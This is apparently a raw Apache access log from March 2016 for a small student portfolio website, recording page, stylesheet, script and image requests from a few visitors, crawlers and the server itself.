149.154.208.130 - - [17/Mar/2016:21:29:05 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:21:44:10 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:21:44:11 +0000] "GET / HTTP/1.1" 404 414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:21:44:12 +0000] "GET / HTTP/1.1" 404 414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:21:44:12 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:21:44:23 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:21:44:49 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:21:44:50 +0000] "GET / HTTP/1.1" 404 414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:21:44:51 +0000] "GET / HTTP/1.1" 404 414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:21:51:50 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:21:51:52 +0000] "GET / HTTP/1.1" 404 414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:22:07:24 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:22:13:08 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:22:13:09 +0000] "GET / HTTP/1.1" 404 414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:22:13:10 +0000] "GET / HTTP/1.1" 404 414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:22:13:10 +0000] "GET / HTTP/1.1" 404 414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:22:13:18 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:22:17:50 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:22:17:51 +0000] "GET / HTTP/1.1" 404 414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:22:17:52 +0000] "GET / HTTP/1.1" 404 414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:22:17:53 +0000] "GET / HTTP/1.1" 404 414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:22:17:54 +0000] "GET / HTTP/1.1" 404 414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:22:17:55 +0000] "GET / HTTP/1.1" 404 414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:22:17:56 +0000] "GET / HTTP/1.1" 404 414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:22:17:57 +0000] "GET / HTTP/1.1" 404 414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:22:17:58 +0000] "GET / HTTP/1.1" 404 414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:22:25:54 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:22:25:55 +0000] "GET / HTTP/1.1" 404 414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:22:25:56 +0000] "GET / HTTP/1.1" 404 414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:22:25:58 +0000] "GET / HTTP/1.1" 404 414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:22:25:59 +0000] "GET / HTTP/1.1" 404 414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:22:33:24 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:22:34:08 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:22:34:09 +0000] "GET / HTTP/1.1" 404 414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
86.111.247.39 - - [17/Mar/2016:22:39:03 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
149.154.208.130 - - [17/Mar/2016:22:50:36 +0000] "GET / HTTP/1.1" 200 426 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:22:53:46 +0000] "GET / HTTP/1.1" 200 426 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
31.13.110.116 - - [17/Mar/2016:22:54:22 +0000] "GET / HTTP/1.1" 206 432 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.122.121 - - [17/Mar/2016:22:54:24 +0000] "GET /favicon.ico HTTP/1.1" 404 389 "-" "facebookexternalhit/1.1"
173.252.122.119 - - [17/Mar/2016:22:54:24 +0000] "GET /favicon.ico HTTP/1.1" 404 389 "-" "facebookexternalhit/1.1"
81.245.67.206 - - [17/Mar/2016:22:54:44 +0000] "GET / HTTP/1.1" 200 426 "https://www.facebook.com" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:22:54:45 +0000] "GET /favicon.ico HTTP/1.1" 404 425 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:22:54:45 +0000] "GET /favicon.ico HTTP/1.1" 404 425 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:08:03 +0000] "GET / HTTP/1.1" 200 3715 "https://www.facebook.com" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:08:04 +0000] "GET /css/bootstrap.min.css HTTP/1.1" 200 21201 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:08:04 +0000] "GET /font-awesome/css/font-awesome.min.css HTTP/1.1" 200 5380 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:08:04 +0000] "GET /js/classie.js HTTP/1.1" 200 1030 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:08:04 +0000] "GET /js/bootstrap.min.js HTTP/1.1" 200 10117 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:08:04 +0000] "GET /css/freelancer.css HTTP/1.1" 200 2233 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:08:04 +0000] "GET /js/jquery.js HTTP/1.1" 200 33578 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:08:04 +0000] "GET /js/cbpAnimatedHeader.js HTTP/1.1" 200 805 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:08:04 +0000] "GET /js/contact_me.js HTTP/1.1" 200 1308 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:08:04 +0000] "GET /js/jqBootstrapValidation.js HTTP/1.1" 200 7133 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:08:04 +0000] "GET /js/freelancer.js HTTP/1.1" 200 971 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:08:04 +0000] "GET /img/profile.png HTTP/1.1" 200 10571 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:08:04 +0000] "GET /img/portfolio/game.png HTTP/1.1" 200 26183 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:08:04 +0000] "GET /img/portfolio/safe.png HTTP/1.1" 200 19527 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:08:04 +0000] "GET /img/portfolio/cake.png HTTP/1.1" 200 17355 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:08:04 +0000] "GET /img/portfolio/circus.png HTTP/1.1" 200 28271 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:08:04 +0000] "GET /img/portfolio/cabin.png HTTP/1.1" 200 36801 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:08:04 +0000] "GET /img/portfolio/submarine.png HTTP/1.1" 200 24617 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:08:04 +0000] "GET /font-awesome/fonts/fontawesome-webfont.woff?v=4.2.0 HTTP/1.1" 200 65751 "http://www.wt4.ephec-ti.be/font-awesome/css/font-awesome.min.css" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
::1 - - [17/Mar/2016:23:08:09 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.10 (Debian) (internal dummy connection)"
149.154.208.130 - - [17/Mar/2016:23:10:02 +0000] "GET / HTTP/1.1" 200 3715 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:23:10:03 +0000] "GET /css/bootstrap.min.css HTTP/1.1" 200 21202 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:23:10:03 +0000] "GET /css/freelancer.css HTTP/1.1" 200 2233 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:23:10:03 +0000] "GET /img/profile.png HTTP/1.1" 200 10572 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:23:10:03 +0000] "GET /img/portfolio/cake.png HTTP/1.1" 200 17356 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:23:10:03 +0000] "GET /img/portfolio/cabin.png HTTP/1.1" 200 36802 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:23:10:03 +0000] "GET /font-awesome/css/font-awesome.min.css HTTP/1.1" 200 5380 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:23:10:03 +0000] "GET /js/jquery.js HTTP/1.1" 200 33577 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:23:10:03 +0000] "GET /js/bootstrap.min.js HTTP/1.1" 200 10116 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:23:10:03 +0000] "GET /js/classie.js HTTP/1.1" 200 1029 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:23:10:03 +0000] "GET /js/cbpAnimatedHeader.js HTTP/1.1" 200 805 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:23:10:03 +0000] "GET /js/jqBootstrapValidation.js HTTP/1.1" 200 7133 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:23:10:03 +0000] "GET /js/freelancer.js HTTP/1.1" 200 971 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:23:10:03 +0000] "GET /img/portfolio/game.png HTTP/1.1" 200 26183 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:23:10:03 +0000] "GET /img/portfolio/circus.png HTTP/1.1" 200 28271 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:23:10:03 +0000] "GET /js/contact_me.js HTTP/1.1" 200 1308 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:23:10:03 +0000] "GET /img/portfolio/safe.png HTTP/1.1" 200 19527 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:23:10:03 +0000] "GET /img/portfolio/submarine.png HTTP/1.1" 200 24617 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:23:10:03 +0000] "GET /font-awesome/fonts/fontawesome-webfont.woff?v=4.2.0 HTTP/1.1" 200 65751 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
::1 - - [17/Mar/2016:23:10:08 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.10 (Debian) (internal dummy connection)"
::1 - - [17/Mar/2016:23:10:09 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.10 (Debian) (internal dummy connection)"
109.133.174.142 - - [17/Mar/2016:23:16:55 +0000] "GET / HTTP/1.1" 200 3715 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36"
109.133.174.142 - - [17/Mar/2016:23:16:55 +0000] "GET /css/freelancer.css HTTP/1.1" 200 2233 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36"
109.133.174.142 - - [17/Mar/2016:23:16:55 +0000] "GET /css/bootstrap.min.css HTTP/1.1" 200 21201 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36"
109.133.174.142 - - [17/Mar/2016:23:16:55 +0000] "GET /font-awesome/css/font-awesome.min.css HTTP/1.1" 200 5380 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36"
109.133.174.142 - - [17/Mar/2016:23:16:55 +0000] "GET /js/classie.js HTTP/1.1" 200 1029 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36"
109.133.174.142 - - [17/Mar/2016:23:16:55 +0000] "GET /img/profile.png HTTP/1.1" 200 10572 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36"
109.133.174.142 - - [17/Mar/2016:23:16:55 +0000] "GET /js/bootstrap.min.js HTTP/1.1" 200 10117 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36"
109.133.174.142 - - [17/Mar/2016:23:16:55 +0000] "GET /js/jquery.js HTTP/1.1" 200 33578 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36"
109.133.174.142 - - [17/Mar/2016:23:16:55 +0000] "GET /js/jqBootstrapValidation.js HTTP/1.1" 200 7133 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36"
109.133.174.142 - - [17/Mar/2016:23:16:55 +0000] "GET /js/cbpAnimatedHeader.js HTTP/1.1" 200 805 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36"
109.133.174.142 - - [17/Mar/2016:23:16:55 +0000] "GET /js/contact_me.js HTTP/1.1" 200 1308 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36"
109.133.174.142 - - [17/Mar/2016:23:16:55 +0000] "GET /js/freelancer.js HTTP/1.1" 200 971 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36"
109.133.174.142 - - [17/Mar/2016:23:16:56 +0000] "GET /img/portfolio/cabin.png HTTP/1.1" 200 36801 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36"
109.133.174.142 - - [17/Mar/2016:23:16:56 +0000] "GET /img/portfolio/cake.png HTTP/1.1" 200 17355 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36"
109.133.174.142 - - [17/Mar/2016:23:16:56 +0000] "GET /img/portfolio/circus.png HTTP/1.1" 200 28271 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36"
109.133.174.142 - - [17/Mar/2016:23:16:56 +0000] "GET /img/portfolio/game.png HTTP/1.1" 200 26183 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36"
109.133.174.142 - - [17/Mar/2016:23:16:56 +0000] "GET /font-awesome/fonts/fontawesome-webfont.woff?v=4.2.0 HTTP/1.1" 200 65751 "http://www.wt4.ephec-ti.be/font-awesome/css/font-awesome.min.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36"
109.133.174.142 - - [17/Mar/2016:23:16:56 +0000] "GET /img/portfolio/safe.png HTTP/1.1" 200 19527 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36"
109.133.174.142 - - [17/Mar/2016:23:16:56 +0000] "GET /img/portfolio/submarine.png HTTP/1.1" 200 24617 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36"
109.133.174.142 - - [17/Mar/2016:23:16:56 +0000] "GET /favicon.ico HTTP/1.1" 404 425 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36"
::1 - - [17/Mar/2016:23:17:02 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.10 (Debian) (internal dummy connection)"
81.245.67.206 - - [17/Mar/2016:23:17:07 +0000] "GET / HTTP/1.1" 200 661 "https://www.facebook.com" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:17:07 +0000] "GET /icons/blank.gif HTTP/1.1" 200 431 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:17:07 +0000] "GET /icons/text.gif HTTP/1.1" 200 512 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:17:07 +0000] "GET /icons/folder.gif HTTP/1.1" 200 509 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [17/Mar/2016:23:17:09 +0000] "GET /_index.html HTTP/1.1" 200 425 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
